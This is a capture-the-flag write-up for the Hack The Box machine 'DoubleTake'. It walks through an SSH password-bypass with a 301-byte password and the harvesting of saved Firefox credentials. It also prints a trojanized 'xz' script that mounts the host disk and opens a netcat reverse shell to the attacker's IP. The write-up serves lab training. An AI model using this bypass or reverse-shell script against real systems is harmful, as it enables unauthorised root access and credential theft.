---
title: DoubleTake
date: 2026-11-25
categories: [Machine]
tags: [easy, linux, sshole, docker]
Author: "[TheCyberGeek](https://app.hackthebox.com/users/114053)"
description: DoubleTake is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH…
toc: true
math: false
layout: post
---

# DoubleTake

`DoubleTake` is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH 10.6p1 compiled against musl. CVE-2026-123158 bypasses password authentication for the `alpine` user by sending a 300-byte password that causes musl's `crypt()` to return `"*"`, matching the locked account's shadow entry. Inside the container, a saved `Firefox` login reveals credentials for the web application on port 80. The platform exposes a deploy endpoint that forwards archives to the Docker API's `PUT /containers/{id}/archive`. Docker 29.5.0 is vulnerable to CVE-2026-41567, which resolves decompression binaries from the container's overlay filesystem instead of the host's. Replacing `/usr/bin/xz` in the container and uploading a compressed archive through the deploy page causes the Docker daemon to execute the trojanized binary as host root.


## Recon

Firstly, NMAP the whole IP with:
```bash
nmap -sC -sV -Pn [ip]

Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-25 08:48 -0600
Nmap scan report for 10.129.156.246
Host is up (0.062s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-auth: 
| HTTP/1.1 401 UNAUTHORIZED\x0D
|_  Basic realm=Zentara
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking at this, ssh is open, there is something interesting called Zentara and we decided to try the alpine linux recent cve SSHOLE, i.e. asshole....
## Solving it

We ssh to it on the alpine user with:
```bash
ssh alpine@10.129.156.246
```
then we use the password:
```plaintext
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
This password is 301 bytes, just enough to pass us by, and we get the login just like that.

Doing ```ls -al``` we can see a '.mozilla' directory, following it to the end we get to a 'logins.json' file:
```json
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara","formActionOrigin":null,"usernameField":"","passwordField":"","encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==","guid":"{a1b2c3d4-e5f6-7890-abcd-ef1234567890}","encType":0,"timeCreated":1730000000000,"timeLastUsed":1730900000000,"timePasswordChanged":1730000000000,"timesUsed":14}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

where we find the B64 encoded user and pass:
```plaintext
user: bob
pass: CorrectHorseBatteryStaple
```
There IS a user bob on the system, which means just ssh out and back in as bob with the given password. This works, now we can read `users.txt` in the bob home directory containing "f9e89987ee927c00c18a99a89f691045". And this is out first 32 bit hex user flag.

Next is the Docker part. We have to upload a file through http://[ip]/deploy that is named `xz` so that it overwrites the `xz` binary. Through the deploy, `xz` actually runs as root so we can open a remote shell. Looking up the CVE for Docker, we can find a PoC from [berdav](https://github.com/berdav) on [github](https://github.com/berdav/CVE-2026-41567/blob/main/test.sh) so we apply the exploit script here as well. We only need to make a few adjustments according to the specific container:
1. With `mount` we check what `sda` partition we are on. In this case, it is `/dev/sda4`;
2. The container doesn't have `ncat`, but it does have `nc`, specifically the `busybox` version. We need to place the `-e` flag at the end.
3. We need to replace the IP with our own IP so the `nc` listener actually words, we also use         `nc -vnlp 50005` to listen for the remote shell.
I used `tar -cJvf shell.tar.xz xz` for compressing the exploit to send it off, once its on the machine we can make changes to it using vi anyways so its not terrible if you make a mistake.

This is the final script:
```sh
#!/bin/sh
PATH=/usr/bin:/bin:/usr/sbin:/sbin

# Mount host filesystems
mount -t proc none /proc >>/tmp/e 2>>/tmp/e
mount -t devtmpfs none /dev >>/tmp/e 2>>/tmp/e
mount /dev/sda4 /mnt >>/tmp/e 2>>/tmp/e
chroot /mnt cat /etc/hostname >>/tmp/e 2>>/tmp/e

# Create a reverse shell on the host (default docker host)
/usr/bin/nc [your local IP] "50005" -e '/bin/sh' 2>>/tmp/e
```

The final flag is in `/root/root.txt`
<details markdown="1">
<summary>Flag</summary>

	Target 1: f9e8...1045; Target 2: 9db2...d1d1

</details>
